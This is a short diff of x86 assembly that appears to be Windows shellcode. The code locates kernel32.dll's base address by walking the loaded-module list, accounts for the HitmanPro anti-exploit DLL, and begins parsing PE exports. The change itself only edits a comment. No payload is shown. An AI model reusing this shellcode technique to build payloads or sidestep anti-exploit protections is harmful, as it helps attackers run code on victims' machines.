@@ -40,7 +40,7 @@ start:
     mov edx,[edx]           ; hmpalert.dll --> delete the line on windows without HitmanPro
     mov edx,[edx]           ; kernel32.dll
     mov ecx,[edx+0x10]      ; Kernel32.dll  base address
-    push ecx                ; Base address [EBX+12]
+    push ecx                ; Base address [EBX-4]
     mov ebx,[esp]           ; Save base address in register EBX 
 
     ; Parse PE File (helpful: PEView)
